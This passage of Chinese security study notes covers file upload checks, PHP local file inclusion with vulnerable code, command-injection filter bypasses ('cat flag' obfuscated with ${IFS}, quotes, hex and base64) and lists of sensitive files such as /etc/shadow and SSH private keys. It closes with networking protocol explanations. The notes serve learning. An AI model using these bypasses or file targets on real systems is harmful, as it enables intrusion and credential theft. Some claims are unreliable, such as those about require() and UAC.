	有些站点上传文件类型限制是在前端实现，这时只要增加上传类型就能突破限制。审查上传点元素，可防止恶意用户上传恶意文件，避免对服务造成安全威胁
2- 文件的合法性：
	审查上传点元素可判断上传文件是否符合规定格式，如图片必须符合图片格式、大小、分辨率等要求，确保上传文件是否合法，以维护网站质量和声誉
3- 提高用户体验：
	审查上传点元素可过滤不符合要求的不合法文件，避免用户上传不合法文件后无法在网站上正常显示或使用，从而提高用户体验
```

### 00x01 目标站上传图片正常，脚本异常原因

```shell
# 目标站无防护，上传图片可正常访问，上传脚本格式访问则 403，什么原因？
	1- 目标站禁止脚本权限访问和执行，只允许静态文件访问，如 html、htm、jpg、gif 等格式。
	2- 目标站可能使用防火墙或其他安全机制来限制访问和执行脚本，为防止恶意脚本在网站上运行或对网站造成潜在威胁
	3- 目标站可能有文件类型白名单或限制，只允许特定类型文件上传和访问，脚本文件可能不在白名单中
	4- 目标站可能有上传文件大小限制，若脚本文件超过限制则可能会收到 403 错误
	5- 目标站可能使用某些过滤技术，如文件名检查或内容检查，以检测可能的恶意活动。若脚本文件被认为是潜在威胁，可能会被阻止并收到 403 错误
```

## 0x00x021 PHP 本地文件包含 (LFI) 漏洞原理

```shell
# LFI（本地文件包含）漏洞是一种安全漏洞，通常出现在使用服务器端脚本语言如 PHP 网站或应用程序中
# 漏洞原理是未充分过滤或验证用户输入的文件路径参数，在读取本地文件时可被攻击者滥用，使攻击者能够读取服务器上的敏感文件
# 工作原理：
	1- 用户输入漏洞点：LFI 漏洞出现在网站或应用程序中存在可接收用户输入的地方，如 URL 或请求参数
	2- 读取文件路径：攻击者通过输入特殊文件路径参数，如 "../" 或 "%00"，绕过正常文件路径验证
	3- 文件包含：服务器端脚本（如 PHP）将用户输入的文件路径与本地文件拼接在一起，并尝试读取这个文件
	4- 敏感文件读取：若服务器端无适当安全措施，攻击者可构造恶意文件路径参数使服务器读取和返回敏感文件的内容，如密码文件、配置文件、用户数据库等
# 防御措施：
	1- 输入验证和过滤：对用户输入进行严格过滤和验证，确保输入文件路径参数只包含有效字符和结构
	2- 使用白名单机制：限制可访问文件路径范围，使用白名单来阻止对敏感文件的访问
	3- 对文件路径规范化：在拼接文件路径前，对用户输入文件路径规范化处理，确保文件路径正确性和安全性
	4- 文件权限控制：服务器上的敏感文件应设置适当的权限，限制对这些文件的读取和执行
# 漏洞代码：
<?php include($_GET['f']);?>
或
<?php
$page = $_GET['page'];
include($page . ".php");
?>
# 手工挖掘 LFI 漏洞
	1- 审查代码：利用用户输入点，审查应用程序中所有使用包含文件的函数、功能或语句的代码，如 include, require, include_once, require_once 等
	2- 黑名单限制：检查代码中是否有限制可包含文件路径的逻辑，如只允许包含指定目录下的文件，或限制路径中不允许出现"../"等特殊字符
	3- 构造恶意输入：尝试通过注入文件路径参数包含恶意文件。可尝试使用相对路径（../）访问父目录下文件，或使用绝对路径来引用任意文件
	4- 获取回显：观察应用程序是否在页面上显示包含的文件内容。成功显示恶意文件的内容说明存在 LFI 漏洞
	# 5- 安全审计工具：使用安全审计工具对代码进行扫描，以发现潜在 LFI 漏洞
# 若无报错回显，如何遍历文件
	1- 尝试已知敏感文件：可尝试包含已知敏感文件，如配置文件（如 mysql 配置文件）或其他含有敏感信息的文件
	2- 使用编码绕过：可尝试使用编码技巧（如 URL 编码、双重编码等）绕过过滤机制，获取访问限制的文件
	3- 字典爆破：可构建包含常见文件名的字典，尝试将每个文件名用作 LFI 漏洞中的参数进行遍历
		可尝试使用常见的文件路径，如 "../index.php"、"../config.php" 等，以尝试读取存在漏洞网站中的敏感文件
		可尝试使用常见的文件名，如 "index.php"、"config.php"、"functions.php" 等，以尝试读取存在漏洞网站中的敏感文件
		可尝试使用常见的目录名称，如 "includes"、"classes"、"plugins" 等，以尝试读取存在漏洞网站中的敏感文件
		可尝试枚举网站的文件目录结构，如通过发送类似 "/admin"、"/includes/" 等路径来获取网站的文件目录结构信息
```

## 文件包含 附加

### 00x00 文件包含伪协议

```shell
1- file://		访问本地文件系统
2- http://		访问 HTTPS 网址
3- ftp://		访问 FTP URL
4- php://		访问输入输出流
5- zlib://		压缩流
6- data://		数据
7- ssh2://		security shell2
8- expect://	处理交互式的流
9- glob://		查找匹配的文件路径
```

### 00x01 文件包含函数

```shell
include()：遇到错误生成警告，继续执行脚本
require()：遇到错误生成致命错误，脚本继续
include_once()：若文件已包含，则不再包含，一定程度避免错误
require()_once()：若文件已包含，则不再包含，一定程度避免错误
fopen()：文件读取函数
file_get_contents()：文件读取函数
```

## 0x00x022 命令执行 bypass

```shell
# 任意命令执行的方式
	1- 利用操作系统命令注入漏洞
	2- 利用应用程序逻辑漏洞

# 管道符号绕过
# 空格绕过
	${IFS}
# %0a、%09
# 重定向绕过
	< <>
# 变量拼接绕过
	@kali:$ a=c;b=at;c=fl;d=ag;$a$b $c$d
# 单引号、双引号绕过
    ca''t flag
	cat"" flag
# 编码绕过
	# $(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
	# {printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
	# $(printf "\154\163") ==>ls
	# $(printf "\154\163")
# 查看等价替换
	(1) more: 按页显示文件内容
	(2) less: 与 more 类似，可[pg dn][pg up] 翻页
	(3) head: 查看头几行
	(4) tac: 从最后一行开始显示，cat 的反向显示
	(5) tail: 查看尾几行
	(6) nl：显示时顺便输出行号
	(7) od: 以二进制方式读取文件内容
	(8) vi: 编辑器，也可查看
	(9) vim: 编辑器，也可查看
	(10) sort: 可查看
	(11) uniq: 可查看
	(12) file -f: 报错出具体内容
# 反斜线绕过
	c\at fl\ag
# 内敛注释绕过
	# `命令` 和 $(命令) 都是执行命令的方式
	echo "m0re`cat flag`"
	echo "m0re $(cat flag)"
# base64 编码绕过
	`echo "Y2F0IGZsYWc="|base64 -d`
# 绕过长度限制
	# >命令会将原有文件内容覆盖
	echo '123'>xxoo.txt
# >> 将字符串添加到文件内容末尾，不覆盖原内容
	echo '233'>>xxoo.txt
# 命令换行绕过
	ca\
	a\
	t\
	fl\
 	ag
```

### 00x00 PHP 命令执行函数

[PHP执行系统命令的有几个常用的函数](https://www.cnblogs.com/ps-blog/p/6944936.html)

```shell
# 在 PHP 中，一些常用的函数与命令执行相关，包括但不限于以下几个：
	1- exec(): 用于执行外部命令，并将命令的输出作为字符串返回
	2- shell_exec(): 与exec()类似，用于执行外部命令，但是将命令的完整输出作为字符串返回
	3- system(): 执行外部命令，并将命令的输出直接打印到标准输出
	4- passthru(): 执行外部命令，并将命令的输出直接发送到标准输出

# - 最好避免使用这些函数，而是使用更安全的替代方法，比如特定的系统调用或库函数。
# - 对传递给这些函数的参数进行严格的输入验证和过滤，以防止攻击者利用命令注入漏洞。
# - 尽量不要将用户提供的数据直接传递给这些命令执行函数，而是使用安全的参数化查询或包装器函数。
# - 在执行命令之前，考虑使用禁用shell特殊字符、设置环境变量以及临时切换工作目录等安全措施。

主要指php漏洞函数serialize和 unserialize，MD5 compare，is_numeric，extract()变量覆盖，命令执行函数system、exec，文件包含require()、require_once()、include()、include_once()
```

## 0x00x023 业务逻辑漏洞及修复

```shell
# 密码找回漏洞
	1- 密码允许暴力破解
	2- 通用型找回凭证
	3- 可跳过验证步骤
	4- 找回凭证可拦包获取
	5- 前端返回
等方式来通过厂商提供的密码找回功能来得到密码
# 身份认证漏洞
	1- 会话固定攻击
	2- Cookie 仿冒
只要得到 Session 或 Cookie 即可伪造用户身份
# 验证码漏洞
	1- 验证码允许暴力破解
	2- 验证码可通过 Javascript 或改包的方法绕过
	3- 空值绕过
	4- 验证码的值可控
```

### 00x00 找回密码利用

```shell
# 目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，如何利用
	1- 爆破用户名，利用被爆破出的用户名爆破密码
	2- 有些站点在登陆处也会这样提示
	3- 所有和数据库有交互的都可能有注入
```

### 00x01 原密码显示*，如何读取用户密码

```shell
# 后台修改管理员密码处原密码显示为*。该怎样读出用户的密码
	1- 审查元素，将密码处 password 属性改为 text 即可明文显示
```

## 0x00x024 未授权访问漏洞

```shell
# 常见的未授权访问漏洞：
	1- Redis 未授权访问漏洞
	2- MongoDB 未授权访问漏洞
	3- Jenkins 未授权访问漏洞
	4- Memcached 未授权访问漏洞
	5- JBOSS 未授权访问漏洞
	6- VNC 未授权访问漏洞
	7- Docker 未授权访问漏洞
	8- ZooKeeper 未授权访问漏洞
	9- Rsync 未授权访问漏洞
	10- Atlassian Crowd 未授权访问漏洞
	11- CouchDB 未授权访问漏洞
	12- Elasticsearch 未授权访问漏洞
	13- Hadoop 未授权访问漏洞
	14- Jupyter Notebook 未授权访问漏洞
```

> 参考链接： https://xz.aliyun.com/t/6103
>
> 参考链接：https://paper.seebug.org/409/
>
> 参考链接： https://www.freebuf.com/articles/web/207877.html

## 0x00x025 代码执行/文件读取/命令执行函数

```shell
# 代码执行：
	1- eval
	2- preg_replace+/e
	3- assert
	4- call_user_func
	5- call_user_func_array
	6- create_function
# 文件读取：
	1- file_get_contents()
	2- highlight_file()
	3- fopen()
	4- read()
	5- file()
	6- fread()
	7- fgetss()
	8- fgets()
	9- parse_ini_file()
	10- show_source()
	11- file()
# 命令执行：
	1- system()
	2- exec()
	3- shell_exec()
	4- passthru()
	5- pcntl_exec()
	6- popen()
	7- proc_open()
```

## 0x00x026 怎样信息收集

```shell
1- 收集域名信息
2- Whois 查询
3- 备案信息查询
4- 敏感信息
5- 子域名信息
6- 收集常用端口信息
7- 指纹识别
8- 查找真实 IP
9- 敏感目录文件
```

## 0x00x027 系统、协议

```shell
# 手工判断系统类型
	Linux 大小写敏感，Windows 大小写不敏感

- OSI 七层模型：应用层、表示层、会话层、传输层、网络层、数据链路层、物理层；
- 常见协议 / 端口：
  - TCP/IP、ARP、SNMP、DHCP、DNS、ARP、IGMP；
- HTTP 请求头：User-Agent、Referer、Host

虚拟专用网络/二层交换机/三层交换机/路由技术

# IPv6 地址 十六进制表示和十进制表示。
十六进制表示是将 IPv6 地址的 128 位二进制数据分成 8 组，每组 16 位，用十六进制数表示，每组之间用冒号分隔
十进制表示是将 IPv6 地址的 128 位二进制数据分成 8 组，每组 16 位，用十进制数表示，每组之间用冒号分隔
```

### 00x00 Windows UAC 原理

```shell
# Windows User Account Control（UAC）是一种安全机制，旨在防止未经授权的更改和运行敏感操作。其原理如下：
1. 操作权限提升：UAC 以默认的标准用户权限运行，当用户尝试执行需要管理员权限的操作时，UAC 会发出提示框，确认用户是否要提升权限。用户需要输入管理员密码或点击“是”来确认。
2. 虚拟化：为减少应用程序对系统的潜在危害，UAC 引入虚拟化技术。当以标准用户权限运行的程序尝试进行系统更改时，UAC 会将其重定向到虚拟化位置，而不是实际的系统位置。这样做可以保护系统免受未经授权的更改。
3. 安全性通知：UAC 会通过弹出窗口、桌面提示或任务栏图标来通知用户正在进行管理员级别的操作。通过这些通知，用户可以知道是否有未经授权的操作正在进行，并可以取消或确认操作。
4. 自动提升：对于某些特定的系统操作，UAC 可以自动提升权限，而无需用户干预。例如，用户更改系统时间、安装应用程序等操作，UAC可以自动提升权限并执行相应的操作。
# 通过实施UAC，Windows可以实现更高的安全性，防止未经授权的更改和恶意软件的传播。它将用户权限的提升和控制集成到操作系统中，帮助用户保护他们的系统免受恶意活动的威胁。

# Windows UAC（用户帐户控制）的原理是通过对用户帐户进行控制，限制用户对系统重要文件的访问和修改权限，以保护系统和用户免受恶意程序的影响。具体来说，当用户登录系统后，系统会为该用户创建一个访问令牌，该令牌包含该用户的用户名和其他凭据信息。当用户运行需要管理员权限的程序时，程序会请求提升权限。此时，UAC会弹出提示框让用户确认是否允许程序提升权限。如果用户同意，系统会临时提升该用户帐户的权限，以便程序能够正常运行。
- UAC 的实现原理是在Windows操作系统中采用了一种称为安全桌面（Secure Desktop）的机制。当UAC提示用户确认程序提升权限时，系统会创建一个新的桌面窗口，并在其中显示UAC提示信息。此时，系统会暂停原桌面上的所有活动窗口，直到用户确认或拒绝提升权限。这样做的目的是为了防止恶意程序利用UAC提示信息进行攻击，如通过弹出假冒的提示信息骗取用户同意提升权限。
- UAC 的另一个重要机制是通知列表（Notification List）。当UAC检测到程序尝试访问受保护的系统文件或注册表项时，会将其添加到通知列表中。这样，即使程序在后台悄悄运行并尝试修改系统设置，用户也可以通过查看通知列表来发现并阻止恶意程序的行动。
# 总之，Windows UAC通过控制用户帐户的权限、采用安全桌面和通知列表等机制，保护系统和用户的计算机安全。
```

### 00x01 配置文件

```shell
# Wdindows 敏感信息：
C:\boot.ini 查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml IIS 配置
C:\Windows\repair\sam 存储系统初次安装的密码
C:\Windows\my.ini 配置信息
C:\Program Files\mysql\my.ini MySQL 配置
C:\Program Files\mysql\data\mysql\user.MYD MySQL root
C:\Windows\php.ini PHP 配置信息
# Linux 敏感信息：
/root/.ssh/authorized_keys ssh authorized_keys 文件，id_rsa.pub 内容
/root/.ssh/id_rsa ssh 私钥，id_rsa.pub 为公钥
/root/.ssh/id_rsa.keystore 记录每个访问计算用户的公钥
/root/.ssh/known_hosts 记录每个访问计算的公钥(public key)；OpenSSH 核对公钥，公钥不同会发出警告，避免受到 DNS Hijack 类攻击
/etc/passwd 账户信息
/etc/shadow 账户密码文件
/etc/my.cnf MySQL 配置文件
/etc/httpd/conf/httpd.conf Apache 配置文件
/root/.bash_history 用户历史命令记录文件
/root/.mysql_history MySQL 历史命令记录文件
/proc/self/fd/fd[0-9]* 文件标识符
/proc/mounts 记录系统挂载设备
/proc/config.gz 内核配置文件
/var/lib/mlocate/mlocate.db 全文件路径
/proc/self/cmdline 当前进程的 cmdline 参数
```

### 00x02 Windows 系统常见漏洞编号

```
ms08-067
ms12-020（3389）
ms15-034(针对iis中间件)
心脏滴血（针对https443）
ms17-010（smb445）
震网三代（美国攻击伊朗核电站）
CVE-2019-0708（3389）
CVE-2020-0796（445）
```

[win常见高危漏洞](https://www.cnblogs.com/dazhu-secure/p/13849242.html)

## 协议 附加

### 00x00 重要协议分布层

```shell
# 在计算机网络中，分布层是网络分层体系结构中的一层，旨在处理网络中不同地理位置的主机之间的通信。在分布层中，有几个重要的协议用于实现各种网络功能。以下是一些在分布层中常见且重要的协议：
1. Border Gateway Protocol (BGP)：BGP是用于在不同自治系统（AS）之间进行路由选择的协议。它帮助在Internet环境中实现跨网络的可靠通信。
2. Intermediate System to Intermediate System (IS-IS)：IS-IS是一种内部网关协议（IGP），用于在具有层次结构的网络中进行路由。它通常用于大型企业和互联网服务提供商（ISP）的骨干网络。
3. Open Shortest Path First (OSPF)：OSPF也是一种内部网关协议，用于在IP网络中计算和选择最佳路径。它通过使用链路状态路由算法来支持动态路由。
4. Hot Standby Router Protocol (HSRP)：HSRP是一种冗余路由协议，用于提供默认网关冗余。它允许多个路由器在故障时自动接管对外通信。
5. Virtual Router Redundancy Protocol (VRRP)：VRRP是类似于HSRP的协议，用于实现默认网关的冗余性。它允许多个路由器组成一个虚拟路由器并提供冗余。
6. Spanning-Tree Protocol (STP)：STP用于在具有冗余连接的网络中防止环路，并提供冗余路径的备份。它选择最佳路径并禁用其他路径，以确保网络拓扑的稳定性。
7. Power over Ethernet (PoE)：PoE是一种协议标准，它允许通过以太网电缆为网络设备提供电力供应。它使得无线接入点、IP电话、摄像头等设备可以通过网络线缆同时传输数据和电力。
# 这些协议在分布层中起着关键的作用，帮助实现数据的传输、路由选择、冗余性和网络稳定性等功能。
```

### 00x01 ARP 协议工作原理

```shell
# ARP（Address Resolution Protocol，地址解析协议）是在网络通信中用于将 IP 地址解析为物理硬件地址（MAC 地址）的协议
# 允许将网络层的 IP 地址映射到链路层的物理地址，以便在局域网络内正确地传递数据包
以下是 ARP 协议的工作原理：
1- 确定目标 IP 地址：
在发送方主机上，当需要发送数据包给具体目标主机时，首先需知道目标主机 IP 地址
2- 查找本地 ARP 高速缓存：
发送方主机首先检查本地 ARP 高速缓存（ARP Cache），其中存储最近与其他主机通信所使用 IP 地址与对应 MAC 地址映射表。若缓存中已存在所需目标 IP 地址的映射，则跳至步骤5
3- 广播 ARP 请求：
若本地 ARP 缓存中无所需 IP 地址映射，发送方主机将广播 ARP 请求消息到局域网中的所有主机。该请求包含发送方 IP 地址和 MAC 地址，并指示需解析目标 IP 地址
4- 接收 ARP 请求的主机响应：
收到 ARP 请求的主机检查请求中的目标 IP 地址是否与自身 IP 地址匹配。若匹配则创建 ARP 响应消息，包含自身 IP 地址和 MAC 地址，并将其发送给发送方主机
5- 更新 ARP 缓存：
发送方主机将接收到 ARP 响应消息中 IP 地址和 MAC 地址添加到本地 ARP 缓存中供以后通信使用
6- 发送数据包：
发送方主机知道目标主机 MAC 地址（ARP 响应获得），将使用目标 IP 地址和目标 MAC 地址构建数据包，并将其发送到局域网上
# 总结起来，ARP 协议工作原理可归纳为：通过 ARP 请求与响应交换过程，主机能解析目标 IP 地址并获取其对应 MAC 地址，从而实现在局域网上正确发送数据包的功能
```

### 00x02 RARP 协议工作原理

```shell
# RARP（Reverse Address Resolution Protocol，逆地址解析协议）与 ARP 相反的协议，用于将物理硬件地址（MAC 地址）解析为 IP 地址
# RARP 协议在启动时，用于在无配置 IP 地址情况下，从网络中获取主机 IP 地址
以下是RARP协议的工作原理：
1. 启动过程：
当主机启动时，若无配置 IP 地址，会发送 RARP 请求消息获取自己 IP 地址。通常发生在无用户干预情况下，如磁盘 less 工作站（diskless workstation）启动时
2. 广播 RARP 请求：
发送 RARP 请求的主机会广播 RARP 请求消息到网络上的所有主机，请求消息包含发送方主机的物理地址（MAC 地址）
3. 接收 RARP 请求并响应：
网络中服务器或路由器等设备接收到 RARP 请求消息搜索其配置 RARP 服务。若找到匹配请求中 MAC 地址 IP 地址映射，则该设备发送 RARP 响应消息，包含对应 IP 地址
4. 更新本地 RARP 缓存：
接收方主机收到 RARP 响应后，将更新其本地 RARP 缓存，将收到 MAC 地址与 IP 地址进行关联
5. 分配 IP 地址：
发送方主机收到 RARP 响应后，使用响应中获取到的 IP 地址进行配置，并将其分配给自身。主机可使用新获得的 IP 地址进行网络通信
# 需注意，RARP 协议在现代网络中已不再广泛使用，因 DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）已取代RARP，在启动时为主机分配 IP 地址。了解 RARP 工作原理仍有助于理解网络协议的演变和网络通信的基本概念
```

### 00x03 RIP 协议工作原理

```shell
# RIP（Routing Information Protocol，路由信息协议）基于距离向量的内部网关协议（IGP），用于在较小规模网络中路由选择，通过交换路由信息维护网络拓扑
下面是 RIP 协议的工作原理：
1- 邻居发现：
发送 RIP 请求报文发现直接邻居路由器。RIP 请求报文使用 RIP 特殊的多播地址（224.0.0.9）发送，目的是寻找相邻的路由器
2- 路由信息交换：
发现相邻的路由器，开始交换路由信息。路由器在各自路由表中维护所有已知网络和距离的列表。路由器定期以 RIP 响应报文形式将各自路由表发送给相邻路由器
3- 更新路由表：
当接收到 RIP 响应报文时，路由器会根据收到的信息更新各自路由表。各路由表项包含目标网络的 IP 地址、下一跳路由器和距离（即到达目标网络的跳数）
4- 距离判断和更新：
收到的路由信息中包含到达目标网络的距离值。路由器比较收到的距离值与各自当前路由表中的距离值，基于距离值决定是否更新路由表。若收到距离值较小说明有更优路径可达目标网络则更新路由表中对应路由项
5- 触发更新和定期更新：触发更新和定期更新
	5.1- 触发更新指当网络拓扑发生变化时，如某个接口断开连接或新网络加入时，会立即发送更新消息通知相邻路由器
	5.2- 定期更新指每隔一定时间，路由器会发送完整路由表给相邻路由器，以确保路由信息的有效性
6- 路由循环避免：
RIP 协议使用跳数（hop count）作为距离衡量的标准，存在路由循环的风险。为避免路由循环，RIP 协议设置最大跳数限制（通常为15），当距离超过限制时将不再接受路径
# 总结起来，RIP 协议的工作原理是通过邻居发现、路由信息交换、更新路由表、距离判断和更新、触发更新和定期更新等过程实现路由选择和网络拓扑维护的功能
```

### 00x04 OSPF 协议工作原理

```shell
# OSPF（Open Shortest Path First，开放最短路径优先）用于内部网关协议（IGP），被广泛用于大型企业网络中，为路由器选择最优路径以在网络中转发数据包
以下是 OSPF 协议的工作原理：
1- 邻居发现：
当 OSPF 路由器启动时，通过发送 Hello 消息探测其他 OSPF 路由器，包含 ID 和其他相关信息。若两个路由器能彼此检测到对方并交换正确参数，就成为邻居
2- 路由器 ID 选择：
每个 OSPF 路由器会选择唯一路由器 ID（Router ID）。ID 可手动配置 IP 地址，可根据优先级和 IP 地址自动选择
3- 链路状态数据库（LSDB）的建立：
邻居关系建立后，OSPF 路由器交换链路状态更新（Link State Update）消息，包含本路由器网络拓扑信息。各路由器使用收到的链路状态信息构建并维护链路状态数据库（LSDB），包含整个 OSPF 域的网络拓扑信息
4- 链路状态广播：
OSPF 路由器定期广播链路状态通告（Link State Advertisement，LSA）消息，以向邻居路由器通知本路由器所了解到的网络拓扑信息。这些消息会被其他 OSPF 路由器接收并更新本地的链路状态数据库
5- 最短路径计算：
使用 Dijkstra 算法，OSPF 路由器根据链路状态数据库中的信息，计算出到达目标网络的最短路径。考虑链路的带宽、延迟等因素来选择最佳路径
6- 路由表更新：
各 OSPF 路由器根据最短路径计算的结果，生成并维护自己的路由表。路由表包含到达各目标网络的最优路径和下一跳路由器
7- 路由更新的传播：
若有路由发生变化，OSPF 路由器会生成路由更新消息，并将其传播给邻居路由器。网络中的所有路由器都能及时了解到网络拓扑的变化，并相应更新各自路由表
# 通过以上步骤，OSPF 协议能够构建一个动态的路由网络，路由器之间通过相互交换链路状态信息并计算最短路径，实现高效的数据包转发
```

### 00x05 DNS 协议工作原理

```shell
# DNS（Domain Name System，域名系统）用于将域名解析为 IP 地址的协议。允许用户通过域名访问互联网资源，而不需记住 IP 地址
以下是 DNS 协议的工作原理：
1- 用户发起域名查询：
当用户在浏览器中输入 URL（如www.example.com）时，系统会向本地 DNS 解析器发出域名查询请求
2- 本地 DNS 解析器查找本地缓存：
本地 DNS 解析器检查本地缓存中是否存在该域名与 IP 地址的映射。若存在则直接返回映射 IP 地址，并跳至步骤6
3- 本地 DNS 解析器查询根域名服务器：
若本地缓存中不存在域名与 IP 地址映射，本地 DNS 解析器将向根域名服务器发送请求。根域名服务器负责管理顶级域名服务器（如 .com、.net、.org 等）IP 地址
4- 根域名服务器提供顶级域名服务器 IP 地址：
根域名服务器收到请求后，会返回顶级域名服务器 IP 地址给本地 DNS 解析器
5- 本地 DNS 解析器查询顶级域名服务器：
本地 DNS 解析器将向顶级域名服务器发送请求，请求该域名的权威域名服务器（该域名的注册商所提供的 DNS 服务器）的 IP 地址
6- 权威域名服务器提供目标主机的 IP 地址：
顶级域名服务器接收到请求后，返回目标主机所属的权威域名服务器的 IP 地址
7. 本地 DNS 解析器查询权威域名服务器：
本地 DNS 解析器向权威域名服务器发送请求，请求该域名所对应的 IP 地址
8- 权威域名服务器返回目标主机的 IP 地址：
权威域名服务器接收到请求后，将域名所对应的 IP 地址返回给本地 DNS 解析器
9- 本地 DNS 解析器更新本地缓存：
本地 DNS 解析器将获取的域名与 IP 地址的映射关系保存到本地缓存中，以便下次查询使用
10- 本地 DNS 解析器返回 IP 地址给用户：
最后，本地 DNS 解析器将解析得到的 IP 地址返回给用户的应用程序，使其能够与目标主机建立连接并获取所需资源
# 总结起来，DNS协议的工作原理可以概括为：通过多级的域名服务器层次结构，将用户发起的域名查询传递到权威域名服务器，并返回目标主机的IP地址，以实现域名与IP地址之间的映射，从而实现用户通过域名访问互联网资源的功能。
```

### 00x06 NAT (网络地址转换) 协议工作原理

```shell
# NAT（Network Address Translation，网络地址转换）一种在互联网连接中常用技术，用于将私有 IP 地址转为公共 IP 地址，以便私有网络和公共网络间通信
NAT 协议的工作原理如下：
1. 私有网络中的设备（如计算机、路由器等）使用私有IP地址（通常是在以下IP地址段中：10.0.0.0 - 10.255.255.255，172.16.0.0 - 172.31.255.255，192.168.0.0 - 192.168.255.255），这些IP地址在公共互联网中是无法直接访问的。
2. 当私有网络中的设备要与互联网上的设备进行通信时，数据包首先发送到网络中的NAT设备（通常是路由器）。
3. NAT设备检查数据包的源IP地址和目的IP地址。
4. 如果源IP地址是私有IP地址，NAT设备将替换数据包的源IP地址为公共IP地址（从NAT设备的公共IP地址池中获取一个可用的公共IP地址）。
5. NAT设备还会将源端口和目的端口进行转换，以保持数据包的连通性。
6. NAT设备将修改后的数据包发送到公共互联网上的目标设备。
7. 公共互联网上的目标设备响应数据包时，数据包首先发送到NAT设备。
8. NAT设备查找与目标设备之前建立的连接信息，将数据包转发回私有网络中的设备，恢复源IP地址、目标IP地址和端口号。
9. 私有网络中的设备接收到数据包后，进行相应的处理。
# 通过 NAT 协议，多个设备可共享一个公共 IP 地址，避免 IPv4 地址短缺问题，并增加网络安全性，因私有网络中设备不直接暴露在公共互联网上。NAT 还可提供端口转换功能，使得多个内部设备可使用同一个公共 IP 地址与公共网络通信
```

### 00x07 三次握手四次挥手

```shell
# "三次握手"和"四次挥手" TCP（Transmission Control Protocol，传输控制协议）用于建立和关闭连接过程。
# TCP 协议中重要的握手和挥手机制，确保数据可靠传输
1. 在建立 TCP 连接时，需三次握手（Three-way Handshake）：
第一步：客户端向服务器发送一个带 SYN（同步序列编号）标志的请求报文段，表示客户端打算建立连接。客户端进入 SYN-SENT 状态
第二步：服务器收到请求后，向客户端发送一个带 SYN/ACK（同步/确认序列编号）标志的应答报文段。表示服务器接受客户端请求，并产生一个新的序列号。服务器进入 SYN-RECEIVED 状态
第三步：客户端收到服务器应答后，向服务器发送一个带 ACK 标志的报文段，表示客户端确认收到服务器应答。双方进入正常 ESTABLISHED 状态，可开始传输数据
# 通过三次握手，TCP 连接建立成功
2. 在关闭 TCP 连接时，需四次挥手（Four-way Handshake）：
第一步：当一方（客户端或服务器）决定关闭连接时，发送一个带 FIN（结束）标志的报文段，表示该方已无数据要发送，但仍可接收数据。发送方进入 FIN-WAIT-1 状态
第二步：接收到关闭请求后，另一方向发送方发送一个 ACK 确认报文段，表示收到关闭请求。接收方进入 CLOSE-WAIT 状态
第三步：接收方继续发送完所有数据后，向发送方发送一个带 FIN 标志的报文段，表示同样希望关闭连接。发送方进入 LAST-ACK 状态
第四步：发送方收到关闭请求后，发送一个 ACK 报文段以确认，并进入 TIME-WAIT 状态。接收方收到 ACK 后进入 CLOSED 状态。发送方在等待一个时间间隔（等待可能存在的延迟报文）后，关闭连接，进入 CLOSED 状态
# 通过四次挥手，TCP 连接顺利关闭
# 三次握手和四次挥手的目的是确保连接的可靠建立和关闭，同时保证双方都能正确地进行数据的传输和接收
```

### 00x08 TCP 如何保证可靠传输

```shell
# TCP（Transmission Control Protocol，传输控制协议）通过以下方式保证可靠传输：
1. 序列号与确认机制：TCP 将每个传输数据包进行编号，接收端会发送确认消息确认已收到的数据包，发送端根据确认消息进行重传或发送下一个数据包。序列号与确认机制确保数据有序性和完整性
2. 数据校验和：TCP 在每个数据包中添加校验和，检测在传输过程中是否出现数据损坏。接收端通过校验和验证数据的正确性，出现损坏则会请求重新传输
3. 超时重传：TCP 设置一个定时器监测数据包发送情况，在设定时间内未收到对应确认消息，发送端会认为数据包丢失，并重新发送该数据包。超时重传机制确保数据可靠性
4. 流量控制：TCP 使用滑动窗口机制进行流量控制。接收端可以通知发送端可以接收的最大数据量，发送端根据接收端的通知进行发送，以避免数据的溢出和丢失。
5. 拥塞控制：TCP 使用拥塞控制算法来避免网络中的拥塞情况。TCP会根据网络的拥塞程度调整发送速率，当网络出现拥塞时会减少发送速率以避免造成更严重的拥塞。
6. 连接建立与终止：TCP 建立连接和终止连接时使用三次握手和四次挥手的机制，确保双方都准备好进行数据传输。
# 通过以上机制，TCP 实现可靠的数据传输，保证数据完整性、有序性和及时性
```

### 00x09 TCP 为何要三次握手

```shell
# TCP（Transmission Control Protocol，传输控制协议）建立可靠连接时使用三次握手过程
# 目的是确保通信双方数据传输能正常进行，避免无效连接请求
TCP 要三次握手的原因：
1. 确保双方都愿意建立连接：第一次握手由客户端发起，服务器接收到请求后，通过回复确认表示自己愿意建立连接。可确保服务器正常运行且愿意处理客户端请求
2. 确保双方初始序列号（Initial Sequence Number，ISN）同步：第二次握手由服务器发起，服务器发送 ISN 给客户端，确认客户端请求。客户端接收到服务器确认后发送确认，且通过响应中 ISN 确认服务器 ISN。可确保双方使用相同初始序列号，用于后续数据通信顺序和可靠性
3. 防止已失效连接请求被接受：第三次握手由客户端发起，客户端确认自己对服务器响应已收到。服务器接收到客户端确认后也确认客户端请求。可防止已失效连接请求被服务器接收，避免浪费服务器资源
# 通过三次握手，TCP 协议可建立可靠连接，双方都确认彼此状态和 ISN，以确保后续数据传输能可靠进行。三次握手提供一种机制避免失效连接请求被接收，增强连接可靠性
```

### 00x10 TCP/UDP 应用层协议

```shell
# TCP 和 UDP 是两种不同的传输层协议，是在网络协议栈中位于应用层之下
# TCP（Transmission Control Protocol，传输控制协议）面向连接的、可靠的协议。提供可靠数据传输、数据流控制、拥塞控制等功能，适用于对数据完整性和可靠性有较高要求的应用。在应用层中与 TCP 协议对应应用层协议有许多，其中常见的包括：
- HTTP（Hypertext Transfer Protocol，超文本传输协议）：用于 Web 浏览器和 Web 服务器间传输超文本的协议，万维网的基础协议
- FTP（File Transfer Protocol，文件传输协议）：用于客户端和服务器间传输文件的协议
- SMTP（Simple Mail Transfer Protocol，简单邮件传输协议）：用于电子邮件的传输协议，用于发送电子邮件
# UDP（User Datagram Protocol，用户数据报协议）无连接、不可靠的协议。提供面向事务的简单传输服务，适用于实时性要求较高、对可靠性要求较低的应用。在应用层中与 UDP 协议对应应用层协议有许多，其中常见的包括：
- DNS（Domain Name System，域名系统）：用于将域名解析为对应的 IP 地址的协议
- RTP（Real-time Transport Protocol，实时传输协议）：用于实时音频和视频传输
